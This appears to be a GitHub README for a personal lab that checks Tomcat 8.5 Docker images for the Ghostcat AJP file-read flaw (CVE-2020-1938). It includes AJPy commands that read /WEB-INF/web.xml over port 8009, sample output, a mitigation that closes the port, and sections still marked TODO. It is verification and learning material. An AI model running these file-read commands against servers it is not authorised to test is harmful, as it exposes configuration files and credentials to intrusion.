# Ghostcat verification (CVE-2020-1938)

## Summary

A new exploit called Ghostcat has been found [CVE-2020-1938], see the articles on [snyk] and [tenable] for details and analysis of the exploit itself.

In my case, I wanted to verify which Tomcat servers are exploitable and if so how does it manifest itself. So this experiment is to check Tomcat 7, 8 and 9.

## Prerequsites

- docker
- python
- git

## Reading file using CVE-2020-1938 on Tomcat 7

>TODO: How to verify a Tomcat 7 is vulnerable?

## Reading file using CVE-2020-1938 on Tomcat 8

Rather than testing exploits on live servers, I am using existing builds of Tomcat to perform my experiment using [AJPy] which crafts AJP requests in order to communicate with AJP connectors.

```bash
git clone --recurse-submodules git@github.com:shaunmclernon/ghostcat-verification.git
cd ghostcat-verification/AJPy
docker run --name tomcat --rm -d -p 8080:8080 -p 8009:8009 tomcat:8.5.32
python tomcat.py read_file --webapp=manager /WEB-INF/web.xml 127.0.0.1
docker stop tomcat
```

If it returns the web.xml then this version of Tomcat is vulnerable to the exploit.

If we try the same test using the latest version of Tomcat 8.5 we can see it is not vulnerable to this particular error.

```bash
docker run --name tomcat --rm -d -p 8080:8080 -p 8009:8009 tomcat:8.5
python tomcat.py read_file --webapp=manager /WEB-INF/web.xml 127.0.0.1
docker stop tomcat
```

In this case, we should get a python error, which actually means the server is not vulnerable;

```bash
Traceback (most recent call last):
  File "tomcat.py", line 377, in <module>
    hdrs, data = bf.perform_request("/" + args.webapp + "/xxxxx.jsp", attributes=attributes)
    ...
    ...
struct.error: unpack requires a buffer of 5 bytes
```

## Reading file using CVE-2020-1938 on Tomcat 9

>TODO: How to verify a Tomcat 9 is vulnerable?

## Springboot

>TODO: How to verify a springboot service is vulnerable?

### Mitigation

Obviously if vulnerable (regardless of the version), you should consider upgrading the to the patched versions. One other option is block access to the AJP port.

Start the same Tomcat version but do not expose the AJP port 8009.

```bash
docker run --name tomcat --rm -d -p 8080:8080 tomcat:8.5.32
python tomcat.py read_file --webapp=manager /WEB-INF/web.xml 127.0.0.1
docker stop tomcat
```

In this case, we can see that it will fail to exploit the server.

## Disclaimer

I am not a security professional and this repo was built for my learning purposes, it is not intended to be used for malicious purposes.

[CVE-2020-1938]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938
[snyk]: https://snyk.io/blog/ghostcat-breach-affects-all-tomcat-versions/
[tenable]: https://www.tenable.com/blog/cve-2020-1938-ghostcat-apache-tomcat-ajp-file-readinclusion-vulnerability-cnvd-2020-10487
[AJPy]: https://github.com/hypn0s/AJPy
